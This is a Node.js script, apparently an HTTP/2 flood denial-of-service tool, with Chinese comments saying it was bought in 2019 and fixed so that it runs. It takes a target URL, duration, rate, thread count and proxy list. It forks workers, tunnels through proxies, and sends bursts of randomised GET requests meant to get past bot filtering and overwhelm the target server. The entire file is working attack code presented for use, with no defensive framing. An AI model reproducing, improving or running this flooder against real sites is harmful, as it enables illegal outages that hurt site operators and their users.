// 此脚本由 山羊 2019年购买
// 刚发现此脚本时无法运行 稍微修改一下成功运行了
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const UserAgent = require("user-agents");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
  console.log(`Usage: node tls.js <target> <time> <rate> <thread> <proxyfile>`);
  process.exit();
}

const headers = {};

function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

const ip_spoof = () => {
  const getRandomByte = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
};

const spoofed = ip_spoof();

const ip_spoof1 = () => {
  const getRandomByte = () => {
    return Math.floor(Math.random() * 50000);
  };
  return `${getRandomByte()}`;
};

async function editedline() {
  try {} catch (error) {}
}

editedline();

const spoofed1 = ip_spoof1();

const args = {
  target: process.argv[2],
  time: parseInt(process.argv[3]),
  Rate: parseInt(process.argv[4]),
  threads: parseInt(process.argv[5]),
  proxyFile: process.argv[6]
};

const sig = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512'
];
const sigalgs1 = sig.join(':');
const cplist = [
  "ECDHE-ECDSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-ECDSA-AES256-GCM-SHA384",
  "ECDHE-RSA-AES256-GCM-SHA384"
];
const accept_header = [
  '*/*',
  'image/*',
  'image/webp,image/apng',
  'text/html',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
];

lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-ZA'
];

const encoding_header = [
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
];

const control_header = ["no-cache", "max-age=0"];

const refers = [
  "https://www.google.com/",
  "https://www.facebook.com/",
  "https://www.twitter.com/",
  "https://www.youtube.com/",
  "https://www.linkedin.com/",
  "https://proxyscrape.com/",
  "https://www.instagram.com/",
  "https://wwww.reddit.com/",
  "https://fivem.net/",
  "https://www.fbi.gov/",
  "https://nettruyenplus.com/",
  "https://vnexpress.net/",
  "https://zalo.me",
  "https://shopee.vn",
  "https://www.tiktok.com/",
  "https://google.com.vn/",
  "https://tuoitre.vn/",
  "https://thanhnien.vn/",
  "https://nettruyento.com/"
];
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers1 = "GREASE:" + [
  defaultCiphers[2],
  defaultCiphers[1],
  defaultCiphers[0],
  ...defaultCiphers.slice(3)
].join(":");

const uap = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 12; V2120 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36"
];

version = [
  '"Google Chrome";v="113", "Chromium";v="113", ";Not A Brand";v="99"',
  '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
];

platform = [
  'Linux',
  'Windows'
];

site = [
  'cross-site',
  'same-origin',
  'same-site',
  'none'
];

mode = [
  'cors',
  'navigate',
  'no-cors',
  'same-origin'
];

dest = [
  'document',
  'image',
  'embed',
  'empty',
  'frame'
];

const rateHeaders = [
  { "akamai-origin-hop": randstr(12) },
  { "proxy-client-ip": randstr(12) },
  { "via": randstr(12) },
  { "cluster-ip": randstr(12) },
];

model = [
  'Windows',
  'Linux x86_64',
  'AMD64'
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
var model1 = model[Math.floor(Math.floor(Math.random() * model.length))];
var platforms = platform[Math.floor(Math.floor(Math.random() * platform.length))];
var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else { setInterval(runFlooder) }

class NetSocket {
  constructor() { }

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
      host: options.host,
      port: options.port
    });

    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);

    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", chunk => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");
      if (isAlive === false) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", error => {
      connection.destroy();
      return callback(undefined, "error: " + error);
    });
  }
}

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.3",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51",
];

const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
const userAgent = new UserAgent();

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(10) + "=" + randstr(5);
headers[":scheme"] = "https";
headers["origin"] = "https://pages.dev/cdn-cgi/trace";
headers["sec-ch-ua"] = ver;
headers["sec-ch-ua-platform"] = "Windows";
headers["sec-ch-ua-mobile"] = "?0";
headers["accept-encoding"] = encoding;
headers["accept-language"] = lang;
headers["user-agent"] = randstr(25);
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = accept;
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-site"] = "same-origin";
headers["TE"] = "trailers";
headers["sec-fetch-user"] = "?1";
headers["x-requested-with"] = "XMLHttpRequest";

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");

  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    timeout: 300,
  };

  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return;

    connection.setKeepAlive(true, 200000);

    const tlsOptions = {
      secure: true,
      ALPNProtocols: ['h2'],
      sigals: siga,
      socket: connection,
      ciphers: cipper,
      ecdhCurve: "prime256v1:secp384r1:secp521r1",
      host: parsedTarget.host,
      rejectUnauthorized: false,
      servername: parsedTarget.host,
      secureProtocol: "TLS_method",
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

    tlsConn.setKeepAlive(true, 60000);

    const client = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 10000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 65536,
        enablePush: false
      },
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => tlsConn,
      socket: connection,
    });

    client.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 10000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 65536,
      enablePush: false
    });

    client.on("connect", () => {
      const IntervalAttack = setInterval(() => {
        const dynHeaders = {
          ...headers,
          ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)]
        };
        for (let i = 0; i < args.Rate; i++) {
          const request = client.request(dynHeaders);

          request.on("response", (headers) => {
            console.log(`[+] ${args.target} ${headers[':status']}`);
            request.close();
            request.destroy();
          });

          request.end();
        }
      }, 500);
    });

    client.on("close", () => {
      client.destroy();
      connection.destroy();
      return;
    });
  }, function (error, response, body) {
    connection.destroy();
    console.log("Error:", error);
  });
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);
